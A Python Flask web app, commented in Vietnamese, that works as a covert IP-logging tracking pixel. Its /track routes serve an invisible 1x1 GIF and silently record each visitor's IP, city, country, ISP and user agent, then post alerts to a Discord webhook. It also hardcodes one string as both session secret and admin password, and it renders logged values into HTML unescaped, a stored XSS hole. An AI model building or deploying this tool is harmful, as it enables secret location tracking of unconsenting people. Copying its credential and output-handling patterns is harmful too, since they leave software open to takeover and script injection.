from flask import Flask, request, render_template, send_file, jsonify, session, redirect, url_for
import os
from datetime import datetime
from functools import lru_cache
import requests
from io import BytesIO

app = Flask(__name__)
app.secret_key = 'EROOTG123'  # Secret key mới

# === CẤU HÌNH ===
ADMIN_PASSWORD = "EROOTG123"  # Mật khẩu đăng nhập mới
DISCORD_WEBHOOK = os.environ.get('DISCORD_WEBHOOK', '')
LOG_DIR = "logs"
MAX_LINES_PER_FILE = 100

# Tạo thư mục logs nếu chưa có
os.makedirs(LOG_DIR, exist_ok=True)

# === HÀM LẤY SỐ FILE LOG HIỆN TẠI ===
def get_current_log_file():
    files = [f for f in os.listdir(LOG_DIR) if f.startswith("logs_") and f.endswith(".txt")]
    if not files:
        return os.path.join(LOG_DIR, "logs_1.txt")
    files.sort()
    last_file = files[-1]
    last_path = os.path.join(LOG_DIR, last_file)
    with open(last_path, 'r', encoding='utf-8') as f:
        line_count = sum(1 for _ in f)
    if line_count >= MAX_LINES_PER_FILE:
        next_num = int(last_file.split('_')[1].split('.')[0]) + 1
        return os.path.join(LOG_DIR, f"logs_{next_num}.txt")
    return last_path

# === HÀM GHI LOG ===
def save_log_to_file(ip, ua, ref, country, city, isp, source='unknown'):
    file_path = get_current_log_file()
    log_entry = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] IP: {ip} | Quốc gia: {country} | Thành phố: {city} | ISP: {isp} | Nguồn: {source} | UA: {ua[:100]}\n"
    with open(file_path, 'a', encoding='utf-8') as f:
        f.write(log_entry)

# === HÀM ĐỌC LOG ===
def read_all_logs():
    all_logs = []
    files = [f for f in os.listdir(LOG_DIR) if f.startswith("logs_") and f.endswith(".txt")]
    files.sort()
    for file in files:
        with open(os.path.join(LOG_DIR, file), 'r', encoding='utf-8') as f:
            for line in f:
                all_logs.append(line.strip())
    return all_logs

# === CÁC HÀM KHÁC ===
def get_real_ip(request):
    cf = request.headers.get('CF-Connecting-IP')
    if cf: return cf
    xff = request.headers.get('X-Forwarded-For')
    if xff: return xff.split(',')[0].strip()
    xri = request.headers.get('X-Real-IP')
    if xri: return xri
    return request.remote_addr

@lru_cache(maxsize=1000)
def get_geo(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,city,isp', timeout=2)
        data = r.json()
        if data.get('status') == 'success':
            return data.get('country', ''), data.get('city', ''), data.get('isp', '')
    except:
        pass
    return '', '', ''

def is_bot(ua):
    BOT_USER_AGENTS = ['Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
                       'YandexBot', 'Sogou', 'Exabot', 'facebot', 'facebookexternalhit',
                       'Twitterbot', 'WhatsApp', 'TelegramBot', 'Discordbot',
                       'UptimeRobot', 'Pingdom', 'NewRelicPinger', 'StatusCake',
                       'curl', 'wget', 'python-requests', 'Go-http-client']
    ua_lower = ua.lower() if ua else ''
    for bot in BOT_USER_AGENTS:
        if bot.lower() in ua_lower:
            return True
    return False

def send_discord_alert(ip, ua, country, city, isp, source='unknown'):
    if not DISCORD_WEBHOOK:
        return
    try:
        message = (f"🆕 IP Mới Được Track!\n📌 IP: `{ip}`\n🌍 Quốc gia: {country}\n"
                   f"🏙️ Thành phố: {city}\n📡 ISP: {isp}\n📂 Nguồn: `{source}`\n"
                   f"🕒 Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        requests.post(DISCORD_WEBHOOK, json={"content": message}, timeout=2)
    except:
        pass

# === ROUTE ===
@app.route('/')
def home():
    return render_template('index.html')

@app.route('/track')
def track():
    return track_with_source('unknown')

@app.route('/track/<source>')
def track_with_source(source):
    ip = get_real_ip(request)
    ua = request.headers.get('User-Agent', '')
    ref = request.headers.get('Referer', '')
    country, city, isp = get_geo(ip)
    save_log_to_file(ip, ua, ref, country, city, isp, source)
    send_discord_alert(ip, ua, country, city, isp, source)
    pixel = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    return send_file(BytesIO(pixel), mimetype='image/gif')

@app.route('/logs')
def view_logs():
    if not session.get('logged_in', False):
        return redirect(url_for('login_page'))
    logs = read_all_logs()
    logs_html = "<br>".join(logs)
    return f"""
    <pre style="background:#111; color:#00ff41; padding:20px; font-family:monospace; min-height:100vh; margin:0;">
    === EROOTG LOGS ===
    Tổng: {len(logs)} dòng
    
    {logs_html}
    </pre>
    """

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        password = request.form.get('password', '')
        if password == ADMIN_PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('view_logs'))
        else:
            return render_template('login.html', error='Sai mật khẩu!')
    return render_template('login.html', error=None)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login_page'))

@app.route('/stats')
def stats():
    logs = read_all_logs()
    return jsonify({
        'total': len(logs),
        'status': 'online'
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
